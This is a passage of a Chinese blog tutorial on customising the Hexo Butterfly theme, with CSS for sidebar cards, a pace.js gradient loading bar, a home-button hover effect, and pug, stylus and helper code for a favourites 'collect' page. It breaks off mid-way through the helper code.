screen <span class="keyword">and</span> (<span class="attribute">min-width</span>: <span class="number">1300px</span>) &#123;</span><br><span class="line">  <span class="selector-id">#aside-content</span> <span class="selector-class">.card-archives</span> <span class="selector-tag">ul</span><span class="selector-class">.card-archive-list</span> &gt; <span class="selector-class">.card-archive-list-item</span> <span class="selector-tag">a</span><span class="selector-pseudo">:hover</span>,</span><br><span class="line">  <span class="selector-id">#aside-content</span> <span class="selector-class">.card-categories</span> <span class="selector-tag">ul</span><span class="selector-class">.card-category-list</span> &gt; <span class="selector-class">.card-category-list-item</span> <span class="selector-tag">a</span><span class="selector-pseudo">:hover</span> &#123;</span><br><span class="line">    <span class="attribute">transform</span>: <span class="built_in">scale</span>(<span class="number">1.03</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="selector-id">#aside-content</span> <span class="selector-class">.card-archives</span> <span class="selector-tag">ul</span><span class="selector-class">.card-archive-list</span> &gt; <span class="selector-class">.card-archive-list-item</span> <span class="selector-tag">a</span><span class="selector-pseudo">:active</span>,</span><br><span class="line">  <span class="selector-id">#aside-content</span> <span class="selector-class">.card-categories</span> <span class="selector-tag">ul</span><span class="selector-class">.card-category-list</span> &gt; <span class="selector-class">.card-category-list-item</span> <span class="selector-tag">a</span><span class="selector-pseudo">:active</span> &#123;</span><br><span class="line">    <span class="attribute">transform</span>: <span class="built_in">scale</span>(<span class="number">0.97</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#aside-content</span> <span class="selector-class">.card-archives</span> <span class="selector-tag">ul</span><span class="selector-class">.card-archive-list</span> &gt; <span class="selector-class">.card-archive-list-item</span> <span class="selector-tag">a</span>,</span><br><span class="line"><span class="selector-id">#aside-content</span> <span class="selector-class">.card-categories</span> <span class="selector-tag">ul</span><span class="selector-class">.card-category-list</span> &gt; <span class="selector-class">.card-category-list-item</span> <span class="selector-tag">a</span> &#123;</span><br><span class="line">  <span class="attribute">border-radius</span>: <span class="number">8px</span>;</span><br><span class="line">  <span class="attribute">margin</span>: <span class="number">4px</span> <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">display</span>: flex;</span><br><span class="line">  <span class="attribute">flex-direction</span>: column;</span><br><span class="line">  <span class="attribute">align-content</span>: space-between;</span><br><span class="line">  <span class="attribute">border</span>: <span class="built_in">var</span>(--style-border);</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#aside-content</span> <span class="selector-class">.card-archives</span> <span class="selector-tag">ul</span><span class="selector-class">.card-archive-list</span> &gt; <span class="selector-class">.card-archive-list-item</span> <span class="selector-tag">a</span> <span class="selector-tag">span</span><span class="selector-pseudo">:first</span>-child,</span><br><span class="line"><span class="selector-id">#aside-content</span> <span class="selector-class">.card-categories</span> <span class="selector-tag">ul</span><span class="selector-class">.card-category-list</span> &gt; <span class="selector-class">.card-category-list-item</span> <span class="selector-tag">a</span> <span class="selector-tag">span</span><span class="selector-pseudo">:first</span>-child &#123;</span><br><span class="line">  <span class="attribute">width</span>: auto;</span><br><span class="line">  <span class="attribute">flex</span>: inherit;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#aside-content</span> <span class="selector-class">.card-archives</span> <span class="selector-tag">ul</span><span class="selector-class">.card-archive-list</span>,</span><br><span class="line"><span class="selector-id">#aside-content</span> <span class="selector-class">.card-categories</span> <span class="selector-tag">ul</span><span class="selector-class">.card-category-list</span> &#123;</span><br><span class="line">  <span class="attribute">display</span>: flex;</span><br><span class="line">  <span class="attribute">flex-direction</span>: row;</span><br><span class="line">  <span class="attribute">justify-content</span>: space-between;</span><br><span class="line">  <span class="attribute">flex-wrap</span>: wrap;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h1 id="加载渐变条"><a href="#加载渐变条" class="headerlink" title="加载渐变条"></a>加载渐变条</h1><div class="tabs" id="6"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#6-1">引入CSS</button></li><li class="tab"><button type="button" data-href="#6-2">在inject中引入 js</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="6-1"><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*顶部加载进度条*/</span></span><br><span class="line"><span class="selector-class">.pace</span> &#123;</span><br><span class="line">  <span class="attribute">pointer-events</span>: none;</span><br><span class="line">  user-select: none;</span><br><span class="line">  <span class="attribute">z-index</span>: <span class="number">2</span>;</span><br><span class="line">  <span class="attribute">position</span>: fixed;</span><br><span class="line">  <span class="attribute">margin</span>: auto;</span><br><span class="line">  <span class="attribute">top</span>: <span class="number">4px</span>;</span><br><span class="line">  <span class="attribute">left</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">right</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">8px</span>;</span><br><span class="line">  <span class="attribute">border-radius</span>: <span class="number">8px</span>;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">6rem</span>;</span><br><span class="line">  <span class="attribute">background</span>: <span class="number">#eaecf2</span>;</span><br><span class="line">  <span class="attribute">overflow</span>: hidden;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.pace-inactive</span> <span class="selector-class">.pace-progress</span> &#123;</span><br><span class="line">  <span class="attribute">opacity</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">transition</span>: <span class="number">0.3s</span> ease-in;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.pace</span><span class="selector-class">.pace-inactive</span> &#123;</span><br><span class="line">  <span class="attribute">opacity</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">transition</span>: <span class="number">0.3s</span>;</span><br><span class="line">  <span class="attribute">top</span>: -<span class="number">8px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.pace</span> <span class="selector-class">.pace-progress</span> &#123;</span><br><span class="line">  <span class="attribute">box-sizing</span>: border-box;</span><br><span class="line">  <span class="attribute">transform</span>: <span class="built_in">translate3d</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="attribute">position</span>: fixed;</span><br><span class="line">  <span class="attribute">z-index</span>: <span class="number">2</span>;</span><br><span class="line">  <span class="attribute">display</span>: block;</span><br><span class="line">  <span class="attribute">position</span>: absolute;</span><br><span class="line">  <span class="attribute">top</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">right</span>: <span class="number">100%</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">100%</span>;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line">  <span class="attribute">background</span>: <span class="number">#49b1f5</span>;</span><br><span class="line">  <span class="attribute">background</span>: <span class="built_in">linear-gradient</span>(</span><br><span class="line">    to right,</span><br><span class="line">    <span class="built_in">rgb</span>(<span class="number">18</span>, <span class="number">194</span>, <span class="number">233</span>),</span><br><span class="line">    <span class="built_in">rgb</span>(<span class="number">196</span>, <span class="number">113</span>, <span class="number">237</span>),</span><br><span class="line">    <span class="built_in">rgb</span>(<span class="number">246</span>, <span class="number">79</span>, <span class="number">89</span>)</span><br><span class="line">  );</span><br><span class="line">  <span class="attribute">animation</span>: gradient <span class="number">2s</span> ease infinite;</span><br><span class="line">  <span class="attribute">background-size</span>: <span class="number">200%</span>;</span><br><span class="line">&#125;</span><br><span class="line">​</span><br><span class="line"><span class="selector-id">#nav-right</span> &#123;</span><br><span class="line">  <span class="attribute">flex</span>: <span class="number">1</span> <span class="number">1</span> auto;</span><br><span class="line">  <span class="attribute">justify-content</span>: flex-end;</span><br><span class="line">  <span class="attribute">margin-left</span>: auto;</span><br><span class="line">  <span class="attribute">display</span>: flex;</span><br><span class="line">  <span class="attribute">flex-wrap</span>: nowrap;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="6-2"><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 顶部小进度条</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">&lt;script</span> <span class="string">data-pjax</span> <span class="string">src=&quot;//npm.elemecdn.com/pace-js@1.2.4/pace.min.js&quot;&gt;&lt;/script&gt;</span></span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h1 id="去掉导航栏项目底下的蓝色长条"><a href="#去掉导航栏项目底下的蓝色长条" class="headerlink" title="去掉导航栏项目底下的蓝色长条"></a>去掉导航栏项目底下的蓝色长条</h1><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-id">#nav</span> *<span class="selector-pseudo">::after</span>&#123;</span><br><span class="line">    <span class="attribute">background-color</span>: transparent<span class="meta">!important</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="回到主页按钮"><a href="#回到主页按钮" class="headerlink" title="回到主页按钮"></a>回到主页按钮</h1><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*回到主页按钮*/</span></span><br><span class="line"><span class="selector-id">#site-name</span><span class="selector-pseudo">::before</span>&#123;</span><br><span class="line">  <span class="attribute">opacity</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">background-color</span>: <span class="built_in">var</span>(--lyx-theme)<span class="meta">!important</span>;</span><br><span class="line">  <span class="attribute">border-radius</span>: <span class="number">8px</span>;</span><br><span class="line">  -webkit-<span class="attribute">border-radius</span>: <span class="number">8px</span>;</span><br><span class="line">  -moz-<span class="attribute">border-radius</span>: <span class="number">8px</span>;</span><br><span class="line">  -ms-<span class="attribute">border-radius</span>: <span class="number">8px</span>;</span><br><span class="line">  -o-<span class="attribute">border-radius</span>: <span class="number">8px</span>;</span><br><span class="line">  <span class="attribute">transition</span>: .<span class="number">3s</span>;</span><br><span class="line">  -webkit-<span class="attribute">transition</span>: .<span class="number">3s</span>;</span><br><span class="line">  -moz-<span class="attribute">transition</span>: .<span class="number">3s</span>;</span><br><span class="line">  -ms-<span class="attribute">transition</span>: .<span class="number">3s</span>;</span><br><span class="line">  -o-<span class="attribute">transition</span>: .<span class="number">3s</span>;</span><br><span class="line">  <span class="attribute">position</span>:absolute;</span><br><span class="line">  <span class="attribute">top</span>:<span class="number">0</span><span class="meta">!important</span>;</span><br><span class="line">  <span class="attribute">right</span>:<span class="number">0</span><span class="meta">!important</span>;</span><br><span class="line">  <span class="attribute">width</span>:<span class="number">100%</span>;</span><br><span class="line">  <span class="attribute">height</span>:<span class="number">100%</span>;</span><br><span class="line">  <span class="attribute">content</span>: <span class="string">&quot;\f015&quot;</span>;</span><br><span class="line">  <span class="attribute">box-shadow</span>: <span class="number">0</span> <span class="number">0</span> <span class="number">5px</span> <span class="built_in">var</span>(--lyx-theme);</span><br><span class="line">  <span class="attribute">font-family</span>: <span class="string">&quot;Font Awesome 6 Free&quot;</span>;</span><br><span class="line">  <span class="attribute">text-align</span>: center;</span><br><span class="line">  <span class="attribute">color</span>:white;</span><br><span class="line">  <span class="attribute">line-height</span>:<span class="number">34px</span>;<span class="comment">/*如果有溢出或者垂直不居中的现象微调一下这个参数*/</span></span><br><span class="line">  <span class="attribute">font-size</span>: <span class="number">18px</span>;<span class="comment">/*根据个人喜好*/</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#site-name</span><span class="selector-pseudo">:hover</span><span class="selector-pseudo">::before</span>&#123;</span><br><span class="line">  <span class="attribute">opacity</span>: <span class="number">1</span>;</span><br><span class="line">  scale:<span class="number">1.03</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#site-name</span>&#123;</span><br><span class="line">  <span class="attribute">position</span>: relative;</span><br><span class="line">  <span class="attribute">font-size</span>: <span class="number">24px</span>; <span class="comment">/*一定要把字体调大点，否则效果惨不忍睹！*/</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-pseudo">:root</span>&#123;</span><br><span class="line">  <span class="attr">--lyx-theme</span>:<span class="number">#87CEEB</span> <span class="comment">/*我的主题色*/</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="收藏界面"><a href="#收藏界面" class="headerlink" title="收藏界面"></a>收藏界面</h1><p>作者链接：<a href="https://blog.leonus.cn/2023/collectPage.html">https://blog.leonus.cn/2023/collectPage.html</a></p><div class="tabs" id="7"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#7-1">添加代码</button></li><li class="tab"><button type="button" data-href="#7-2">新建collect.pug</button></li><li class="tab"><button type="button" data-href="#7-3">新建collect.styl</button></li><li class="tab"><button type="button" data-href="#7-4">加辅助函数</button></li><li class="tab"><button type="button" data-href="#7-5">新建collect.yml</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="7-1"><p>在<code>[blogRoot]\themes\butterfly\layout\page.pug</code>中添加如下代码：</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">when &#x27;tags&#x27;</span><br><span class="line">  include includes/page/tags.pug</span><br><span class="line">when &#x27;link&#x27;</span><br><span class="line">  include includes/page/flink.pug</span><br><span class="line">when &#x27;categories&#x27;</span><br><span class="line">  include includes/page/categories.pug</span><br><span class="line"><span class="addition">+  when &#x27;collect&#x27;</span></span><br><span class="line"><span class="addition">+  include includes/page/collect.pug</span></span><br><span class="line">default</span><br><span class="line">  include includes/page/default-page.pug</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="7-2"><p>在<code>[blogRoot]\themes\butterfly\layout\includes\page</code>下新建collect.pug文件并粘贴如下代码：<br>（样式可能需要根据自己的页面进行微调）</p><figure class="highlight styl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-id">#article-container</span></span><br><span class="line">  <span class="selector-class">.collect</span></span><br><span class="line">    - let collectPageContent = page<span class="selector-class">.content</span></span><br><span class="line">    <span class="keyword">if</span> site<span class="selector-class">.data</span><span class="selector-class">.collect</span></span><br><span class="line">      - let result = <span class="string">&quot;&quot;</span></span><br><span class="line">      each <span class="selector-tag">i</span> <span class="keyword">in</span> site<span class="selector-class">.data</span><span class="selector-class">.collect</span></span><br><span class="line">        - let className = <span class="selector-tag">i</span><span class="selector-class">.class_name</span> ? `&lt;<span class="selector-tag">h2</span> $&#123;<span class="selector-tag">i</span>.class_desc?<span class="string">&#x27;&#x27;</span>:<span class="string">&#x27;style=&quot;margin-bottom:12px&quot;&#x27;</span>&#125;&gt;$&#123;<span class="selector-tag">i</span>.class_name&#125; ($&#123;<span class="selector-tag">i</span><span class="selector-class">.link_list</span>.length&#125;)&lt;/h2&gt;` : <span class="string">&quot;&quot;</span></span><br><span class="line">        - let classDesc = <span class="selector-tag">i</span><span class="selector-class">.class_desc</span> ? `&lt;<span class="selector-tag">div</span> class=<span class="string">&quot;collect-desc&quot;</span>&gt;$&#123;<span class="selector-tag">i</span>.class_desc&#125;&lt;/div&gt;` : <span class="string">&quot;&quot;</span></span><br><span class="line">        - let listResult = <span class="string">&quot;&quot;</span></span><br><span class="line">        each j <span class="keyword">in</span> <span class="selector-tag">i</span><span class="selector-class">.link_list</span></span><br><span class="line">          - </span><br><span class="line">            listResult += `</span><br><span class="line">              &lt;<span class="selector-tag">div</span> title=<span class="string">&quot;$&#123;j.name&#125;&quot;</span> referrerPolicy=<span class="string">&quot;no-referrer&quot;</span> class=<span class="string">&quot;collect_box&quot;</span> style=<span class="string">&quot;$&#123;j.img?`background-image: url($&#123;j.img&#125;)`:&#x27;background-color: #333;&#x27;&#125;&quot;</span>&gt;</span><br><span class="line">                  &lt;<span class="selector-tag">div</span> class=<span class="string">&quot;collect_top&quot;</span>&gt;</span><br><span class="line">                    &lt;<span class="selector-tag">i</span> class=<span class="string">&quot;$&#123;j.icon?j.icon:&#x27;fa-solid fa-film&#x27;&#125;&quot;</span>&gt;&lt;/i&gt;</span><br><span class="line">                    &lt;span&gt;$&#123;j.tip?j<span class="selector-class">.tip</span>:<span class="string">&#x27;电影&#x27;</span>&#125;&lt;/span&gt;</span><br><span class="line">                  &lt;/div&gt;</span><br><span class="line">                  &lt;<span class="selector-tag">div</span> class=<span class="string">&quot;collect_content&quot;</span>&gt;</span><br><span class="line">                    &lt;span&gt;$&#123;j.name?j<span class="selector-class">.name</span>:<span class="string">&#x27;未知&#x27;</span>&#125;&lt;/span&gt;</span><br><span class="line">                    &lt;div&gt;$&#123;j.score?<span class="built_in">toStar</span>(j.score):<span class="built_in">toStar</span>(<span class="number">0</span>)&#125;&lt;/div&gt;</span><br><span class="line">                  &lt;/div&gt;</span><br><span class="line">                &lt;/div&gt;</span><br><span class="line">              `</span><br><span class="line">          -</span><br><span class="line">        - result += `$&#123;className&#125;$&#123;classDesc&#125; &lt;<span class="selector-tag">div</span> class=<span class="string">&quot;collect-list&quot;</span>&gt;$&#123;listResult&#125;&lt;/div&gt;`</span><br><span class="line">      - collectPageContent = collectPageContent + result</span><br><span class="line">    != collectPageContent</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="7-3"><p>在<code>[blogRoot]\themes\butterfly\source\css\_page</code>下新建collect.styl文件并粘贴如下代码：</p><figure class="highlight styl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.collect</span></span><br><span class="line">  <span class="selector-tag">h2</span></span><br><span class="line">    <span class="attribute">margin-bottom</span>: <span class="number">0</span></span><br><span class="line">  <span class="selector-class">.collect-desc</span></span><br><span class="line">    <span class="attribute">margin-bottom</span>: <span class="number">10px</span></span><br><span class="line">  <span class="selector-class">.collect-list</span></span><br><span class="line">    <span class="attribute">display</span>: flex</span><br><span class="line">    <span class="attribute">gap</span>: <span class="number">18px</span></span><br><span class="line">    <span class="attribute">flex-wrap</span>: wrap</span><br><span class="line">    <span class="selector-class">.collect_box</span></span><br><span class="line">      <span class="attr">--w</span>: <span class="built_in">calc</span>(<span class="number">100%</span> / <span class="number">6</span> - <span class="number">15px</span>)</span><br><span class="line">      <span class="attribute">width</span>: <span class="built_in">var</span>(--w)</span><br><span class="line">      <span class="attribute">display</span>: flex</span><br><span class="line">      <span class="attribute">justify-content</span>: space-between</span><br><span class="line">      <span class="attribute">flex-direction</span>: column</span><br><span class="line">      <span class="attribute">background-position</span>: center</span><br><span class="line">      <span class="attribute">background-size</span>: cover</span><br><span class="line">      <span class="attribute">border-radius</span>: <span class="number">12px</span></span><br><span class="line">      <span class="attribute">position</span>: relative</span><br><span class="line">      <span class="attribute">overflow</span>: hidden</span><br><span class="line">      <span class="attribute">padding</span>: <span class="number">10px</span></span><br><span class="line">      <span class="attribute">color</span>: <span class="number">#fff</span></span><br><span class="line">      <span class="attribute">transition</span>: .<span class="number">5s</span></span><br><span class="line">      <span class="selector-pseudo">&amp;::after</span></span><br><span class="line">        <span class="attribute">content</span>: <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="attribute">position</span>: absolute</span><br><span class="line">        <span class="attribute">height</span>: <span class="number">100%</span></span><br><span class="line">        <span class="attribute">width</span>: <span class="number">100%</span></span><br><span class="line">        <span class="attribute">left</span>: <span class="number">0</span></span><br><span class="line">        <span class="attribute">top</span>: <span class="number">0</span></span><br><span class="line">        <span class="attribute">background</span>: <span class="built_in">rgba</span>(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0.3</span>)</span><br><span class="line">        <span class="attribute">z-index</span>: <span class="number">0</span></span><br><span class="line">        <span class="attribute">transition</span>: .<span class="number">5s</span></span><br><span class="line">      <span class="selector-pseudo">&amp;:hover</span></span><br><span class="line">        <span class="attribute">transform</span>: <span class="built_in">translateY</span>(-<span class="number">10px</span>)</span><br><span class="line">        <span class="selector-pseudo">&amp;::after</span></span><br><span class="line">          <span class="attribute">background</span>: <span class="built_in">rgba</span>(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0.1</span>)</span><br><span class="line">      <span class="selector-class">.collect_top</span></span><br><span class="line">        <span class="attribute">display</span>: flex</span><br><span class="line">        <span class="attribute">z-index</span>: <span class="number">1</span></span><br><span class="line">        <span class="attribute">align-items</span>: center</span><br><span class="line">        <span class="attribute">justify-content</span>: space-between</span><br><span class="line">      <span class="selector-class">.collect_content</span></span><br><span class="line">        <span class="attribute">z-index</span>: <span class="number">1</span></span><br><span class="line">        <span class="attribute">margin-top</span>: <span class="number">86%</span></span><br><span class="line">        <span class="selector-tag">span</span></span><br><span class="line">          <span class="attribute">display</span>: block</span><br><span class="line">          <span class="attribute">font-size</span>: <span class="number">18px</span></span><br><span class="line">          <span class="attribute">font-weight</span>: bold</span><br><span class="line">          <span class="attribute">white-space</span>: nowrap</span><br><span class="line">          <span class="attribute">overflow</span>: hidden</span><br><span class="line">          <span class="attribute">text-overflow</span>: ellipsis</span><br><span class="line"></span><br><span class="line"><span class="selector-attr">[data-theme=<span class="string">&#x27;dark&#x27;</span>]</span></span><br><span class="line">  <span class="selector-class">.collect</span> <span class="selector-class">.collect-list</span> <span class="selector-class">.collect_box</span></span><br><span class="line">    <span class="attribute">color</span>: <span class="number">#ddd</span> <span class="meta">!important</span></span><br><span class="line">    <span class="selector-pseudo">&amp;:hover</span></span><br><span class="line">      <span class="attribute">transform</span>: <span class="built_in">translateY</span>(-<span class="number">10px</span>)</span><br><span class="line">      <span class="selector-pseudo">&amp;::after</span></span><br><span class="line">        <span class="attribute">background</span>: <span class="built_in">rgba</span>(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0.2</span>)</span><br><span class="line">    <span class="selector-pseudo">&amp;::after</span></span><br><span class="line">      <span class="attribute">background</span>: <span class="built_in">rgba</span>(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0.5</span>)</span><br><span class="line"><span class="selector-class">.collect</span> <span class="selector-class">.collect-list</span></span><br><span class="line">  <span class="keyword">@media</span> screen <span class="keyword">and</span> (<span class="attribute">max-width</span>: <span class="number">1100px</span>)</span><br><span class="line">    gap: <span class="number">15px</span></span><br><span class="line">    .collect_box</span><br><span class="line">      --w: calc(<span class="number">20%</span> - <span class="number">12px</span>)</span><br><span class="line">  @media screen <span class="keyword">and</span> (<span class="attribute">max-width</span>: <span class="number">900px</span>)</span><br><span class="line">    gap: <span class="number">16px</span></span><br><span class="line">    .collect_box</span><br><span class="line">      --w: calc(<span class="number">25%</span> - <span class="number">12px</span>)</span><br><span class="line">  @media screen <span class="keyword">and</span> (<span class="attribute">max-width</span>: <span class="number">768px</span>)</span><br><span class="line">    gap: <span class="number">15px</span></span><br><span class="line">    .collect_box</span><br><span class="line">      --w: calc(<span class="number">100%</span> / <span class="number">3</span> - <span class="number">10px</span>)</span><br><span class="line">  @media screen <span class="keyword">and</span> (<span class="attribute">max-width</span>: <span class="number">500px</span>)</span><br><span class="line">    gap: <span class="number">16px</span></span><br><span class="line">    .collect_box</span><br><span class="line">      --w: calc(<span class="number">50%</span> - <span class="number">8px</span>)</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="7-4"><p>在<code>[blogRoot]themes\butterfly\scripts\helpers\page.js</code>的合适位置粘贴如下代码：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 藏宝阁星星</span></span><br><span class="line">hexo.<span class="property">extend</span>.<span class="property">helper</span>.<span class="title function_">register</span>(<span class="string">&#x27;toStar&#x27;</span>, <span class="keyword">function</span>(<span class="params">num</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> tmp = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="title class_">Math</span>.<span class="title function_">floor</span>(num); i++) &#123; tmp += <span class="string">&#x27;&lt;i class=&quot;fa-solid fa-star&quot;&gt;&lt;/i&gt;&#x27;</span> &#125; <span class="comment">// 整数部分加 实心星星</span></span><br><span class="line">    <span class="keyword">if</span> (num - <span class="title class_">Math</span>.<span class="title function_">floor</span>(num) != <span class="number">0</span>) tmp += <span class="string">&#x27;&lt;i class=&quot;fa-solid fa-star-half-alt&quot;&gt;&lt;/i&gt;&#x27;</span> <span class="comment">// 小数部分转成 半星</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span 